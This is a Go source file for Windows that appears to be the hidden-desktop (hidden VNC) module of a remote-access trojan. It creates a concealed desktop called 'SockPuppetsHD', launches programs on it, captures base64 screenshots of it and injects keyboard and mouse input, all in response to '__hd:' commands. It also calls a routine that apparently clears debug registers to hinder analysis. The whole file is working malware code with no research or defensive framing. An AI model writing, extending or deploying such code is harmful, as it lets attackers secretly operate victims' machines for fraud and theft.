//go:build windows

package main

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

const hdName = "SockPuppetsHD"

var (
	hdUser32              = syscall.NewLazyDLL("user32.dll")
	hdGdi32               = syscall.NewLazyDLL("gdi32.dll")
	hdKernel32            = syscall.NewLazyDLL("kernel32.dll")
	procCreateDesktopW    = hdUser32.NewProc("CreateDesktopW")
	procOpenDesktopW      = hdUser32.NewProc("OpenDesktopW")
	procSetThreadDesktop  = hdUser32.NewProc("SetThreadDesktop")
	procCloseDesktop      = hdUser32.NewProc("CloseDesktop")
	procGetDC             = hdUser32.NewProc("GetDC")
	procReleaseDC         = hdUser32.NewProc("ReleaseDC")
	procGetSystemMetrics  = hdUser32.NewProc("GetSystemMetrics")
	procKeybdEvent        = hdUser32.NewProc("keybd_event")
	procMouseEvent        = hdUser32.NewProc("mouse_event")
	procVkKeyScanW        = hdUser32.NewProc("VkKeyScanW")
	procCreateCompatibleDC = hdGdi32.NewProc("CreateCompatibleDC")
	procCreateCompatibleBitmap = hdGdi32.NewProc("CreateCompatibleBitmap")
	procSelectObject      = hdGdi32.NewProc("SelectObject")
	procStretchBlt        = hdGdi32.NewProc("StretchBlt")
	procGetDIBits         = hdGdi32.NewProc("GetDIBits")
	procDeleteObject      = hdGdi32.NewProc("DeleteObject")
	procDeleteDC          = hdGdi32.NewProc("DeleteDC")
	procCreateProcessW    = hdKernel32.NewProc("CreateProcessW")
	procCloseHandle       = hdKernel32.NewProc("CloseHandle")
)

const (
	hdGenericAll          = 0x10000000
	hdSrcCopy             = 0x00CC0020
	hdStartfUseShowWindow = 0x1
	hdSwShow              = 5
	hdCreateUnicodeEnv    = 0x400
	hdKeyUp               = 0x2
	hdMouseMove           = 0x0001
	hdMouseLeftDown       = 0x0002
	hdMouseLeftUp         = 0x0004
	hdMouseRightDown      = 0x0008
	hdMouseRightUp        = 0x0010
	hdMouseAbsolute       = 0x8000
)

type hdStartupInfo struct {
	cb            uint32
	_             uint32
	reserved      *uint16
	desktop       *uint16
	title         *uint16
	x             uint32
	y             uint32
	xSize         uint32
	ySize         uint32
	xCountChars   uint32
	yCountChars   uint32
	fillAttribute uint32
	flags         uint32
	showWindow    uint16
	cbReserved2   uint16
	_pad          uint32
	lpReserved2   *byte
	stdInput      syscall.Handle
	stdOutput     syscall.Handle
	stdError      syscall.Handle
}

type hdProcessInfo struct {
	process syscall.Handle
	thread  syscall.Handle
	pid     uint32
	tid     uint32
}

type hdBitmapInfoHeader struct {
	size          uint32
	width         int32
	height        int32
	planes        uint16
	bitCount      uint16
	compression   uint32
	sizeImage     uint32
	xppm          int32
	yppm          int32
	clrUsed       uint32
	clrImportant  uint32
}

var hdDesktop syscall.Handle

func nativeUser() string {
	var n uint32 = 256
	buf := make([]uint16, n)
	r, _, _ := syscall.NewLazyDLL("advapi32.dll").NewProc("GetUserNameW").Call(
		uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&n)),
	)
	if r == 0 {
		return ""
	}
	return syscall.UTF16ToString(buf[:n])
}

func handleHiddenDesktop(cmd string) string {
	rest := strings.TrimPrefix(cmd, "__hd:")
	action, arg, _ := strings.Cut(strings.TrimSpace(rest), " ")
	action = strings.TrimSpace(action)
	arg = strings.TrimSpace(arg)
	switch action {
	case "", "start":
		return hdStart(arg)
	case "frame":
		return hdFrame()
	case "key":
		vk, _ := strconv.Atoi(arg)
		if vk == 0 {
			vk = 13
		}
		return hdKey(vk)
	case "click":
		return hdClick(arg, false)
	case "rclick":
		return hdClick(arg, true)
	case "type":
		return hdType(arg)
	case "stop":
		return hdStop()
	default:
		return "unknown desktop action"
	}
}

func hdEnsure() error {
	if hdDesktop != 0 {
		return nil
	}
	name, err := syscall.UTF16PtrFromString(hdName)
	if err != nil {
		return err
	}
	r, _, callErr := procCreateDesktopW.Call(uintptr(unsafe.Pointer(name)), 0, 0, 0, hdGenericAll, 0)
	if r == 0 {
		r, _, callErr = procOpenDesktopW.Call(uintptr(unsafe.Pointer(name)), 0, 0, hdGenericAll)
		if r == 0 {
			return callErr
		}
	}
	hdDesktop = syscall.Handle(r)
	return nil
}

func hdStart(exe string) string {
	if exe == "" {
		exe = `C:\Windows\explorer.exe`
	}
	return hdOnDesktop(func() string {
		desktop, _ := syscall.UTF16PtrFromString(`WinSta0\` + hdName)
		cmd, err := syscall.UTF16FromString(exe)
		if err != nil {
			return "bad command: " + err.Error()
		}
		var si syscall.StartupInfo
		si.Cb = uint32(unsafe.Sizeof(si))
		si.Desktop = desktop
		si.Flags = hdStartfUseShowWindow
		si.ShowWindow = hdSwShow
		var pi syscall.ProcessInformation
		ok, _, callErr := procCreateProcessW.Call(
			0,
			uintptr(unsafe.Pointer(&cmd[0])),
			0, 0, 0,
			0x10,
			0, 0,
			uintptr(unsafe.Pointer(&si)),
			uintptr(unsafe.Pointer(&pi)),
		)
		runtime.KeepAlive(cmd)
		runtime.KeepAlive(desktop)
		if ok == 0 {
			return "spawn failed: " + callErr.Error()
		}
		pid := pi.ProcessId
		procCloseHandle.Call(uintptr(pi.Process))
		procCloseHandle.Call(uintptr(pi.Thread))
		return fmt.Sprintf("desktop started pid=%d", pid)
	})
}

func hdFrame() string {
	if err := hdEnsure(); err != nil {
		return "desktop open failed: " + err.Error()
	}
	ch := make(chan string, 1)
	go func() {
		defer func() {
			if rec := recover(); rec != nil {
				ch <- fmt.Sprintf("desktop error: %v", rec)
			}
		}()
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		ch <- hdCapture()
	}()
	return <-ch
}

func hdCapture() string {
	if r, _, err := procSetThreadDesktop.Call(uintptr(hdDesktop)); r == 0 {
		return "set desktop failed: " + err.Error()
	}
	hdc, _, _ := procGetDC.Call(0)
	if hdc == 0 {
		return "no desktop dc"
	}
	defer procReleaseDC.Call(0, hdc)
	sw, _, _ := procGetSystemMetrics.Call(0)
	sh, _, _ := procGetSystemMetrics.Call(1)
	if sw == 0 || sh == 0 {
		sw, sh = 1024, 768
	}
	dw, dh := int(sw), int(sh)
	if dw > 320 {
		dh = dh * 320 / dw
		dw = 320
	}
	if dh < 1 {
		dh = 1
	}
	memDC, _, _ := procCreateCompatibleDC.Call(hdc)
	if memDC == 0 {
		return "compatible dc failed"
	}
	defer procDeleteDC.Call(memDC)
	bmp, _, _ := procCreateCompatibleBitmap.Call(hdc, uintptr(dw), uintptr(dh))
	if bmp == 0 {
		return "bitmap failed"
	}
	defer procDeleteObject.Call(bmp)
	old, _, _ := procSelectObject.Call(memDC, bmp)
	procStretchBlt.Call(memDC, 0, 0, uintptr(dw), uintptr(dh), hdc, 0, 0, sw, sh, hdSrcCopy)
	procSelectObject.Call(memDC, old)
	stride := ((dw*3 + 3) / 4) * 4
	pixels := make([]byte, stride*dh)
	bi := hdBitmapInfoHeader{
		size:     40,
		width:    int32(dw),
		height:   int32(dh),
		planes:   1,
		bitCount: 24,
	}
	procGetDIBits.Call(memDC, bmp, 0, uintptr(dh), uintptr(unsafe.Pointer(&pixels[0])), uintptr(unsafe.Pointer(&bi)), 0)
	file := make([]byte, 54+len(pixels))
	copy(file[0:2], "BM")
	binary.LittleEndian.PutUint32(file[2:], uint32(len(file)))
	binary.LittleEndian.PutUint32(file[10:], 54)
	binary.LittleEndian.PutUint32(file[14:], 40)
	binary.LittleEndian.PutUint32(file[18:], uint32(dw))
	binary.LittleEndian.PutUint32(file[22:], uint32(dh))
	binary.LittleEndian.PutUint16(file[26:], 1)
	binary.LittleEndian.PutUint16(file[28:], 24)
	copy(file[54:], pixels)
	return fmt.Sprintf("HDIMG:%d,%d:", sw, sh) + base64.StdEncoding.EncodeToString(file)
}

func hdKey(vk int) string {
	if err := hdEnsure(); err != nil {
		return "desktop open failed: " + err.Error()
	}
	done := make(chan string, 1)
	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		if r, _, err := procSetThreadDesktop.Call(uintptr(hdDesktop)); r == 0 {
			done <- "set desktop failed: " + err.Error()
			return
		}
		procKeybdEvent.Call(uintptr(vk), 0, 0, 0)
		procKeybdEvent.Call(uintptr(vk), 0, hdKeyUp, 0)
		done <- fmt.Sprintf("key %d", vk)
	}()
	return <-done
}

func hdOnDesktop(fn func() string) string {
	if err := hdEnsure(); err != nil {
		return "desktop open failed: " + err.Error()
	}
	done := make(chan string, 1)
	go func() {
		defer func() {
			if rec := recover(); rec != nil {
				done <- fmt.Sprintf("desktop error: %v", rec)
			}
		}()
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		clearDebugRegisters()
		if r, _, err := procSetThreadDesktop.Call(uintptr(hdDesktop)); r == 0 {
			done <- "set desktop failed: " + err.Error()
			return
		}
		done <- fn()
	}()
	return <-done
}

func hdClick(arg string, right bool) string {
	fields := strings.Fields(arg)
	if len(fields) < 2 {
		return "click needs x y"
	}
	x, errX := strconv.Atoi(fields[0])
	y, errY := strconv.Atoi(fields[1])
	if errX != nil || errY != nil {
		return "click needs x y"
	}
	return hdOnDesktop(func() string {
		sw, _, _ := procGetSystemMetrics.Call(0)
		sh, _, _ := procGetSystemMetrics.Call(1)
		if sw == 0 || sh == 0 {
			sw, sh = 1024, 768
		}
		ax := uintptr(x) * 65535 / sw
		ay := uintptr(y) * 65535 / sh
		procMouseEvent.Call(hdMouseAbsolute|hdMouseMove, ax, ay, 0, 0)
		if right {
			procMouseEvent.Call(hdMouseRightDown, 0, 0, 0, 0)
			procMouseEvent.Call(hdMouseRightUp, 0, 0, 0, 0)
			return fmt.Sprintf("rclick %d %d", x, y)
		}
		procMouseEvent.Call(hdMouseLeftDown, 0, 0, 0, 0)
		procMouseEvent.Call(hdMouseLeftUp, 0, 0, 0, 0)
		return fmt.Sprintf("click %d %d", x, y)
	})
}

func hdType(text string) string {
	if text == "" {
		return "type needs text"
	}
	return hdOnDesktop(func() string {
		for _, r := range text {
			hdTypeRune(r)
		}
		return fmt.Sprintf("typed %d", len([]rune(text)))
	})
}

func hdTypeRune(r rune) {
	if r == '\n' || r == '\r' {
		procKeybdEvent.Call(13, 0, 0, 0)
		procKeybdEvent.Call(13, 0, hdKeyUp, 0)
		return
	}
	vkPair, _, _ := procVkKeyScanW.Call(uintptr(r))
	vk := byte(vkPair)
	if vk == 0xFF {
		return
	}
	shift := (vkPair >> 8) & 1
	if shift != 0 {
		procKeybdEvent.Call(0x10, 0, 0, 0)
	}
	procKeybdEvent.Call(uintptr(vk), 0, 0, 0)
	procKeybdEvent.Call(uintptr(vk), 0, hdKeyUp, 0)
	if shift != 0 {
		procKeybdEvent.Call(0x10, 0, hdKeyUp, 0)
	}
}

func hdStop() string {
	if hdDesktop != 0 {
		procCloseDesktop.Call(uintptr(hdDesktop))
		hdDesktop = 0
	}
	return "desktop stopped"
}
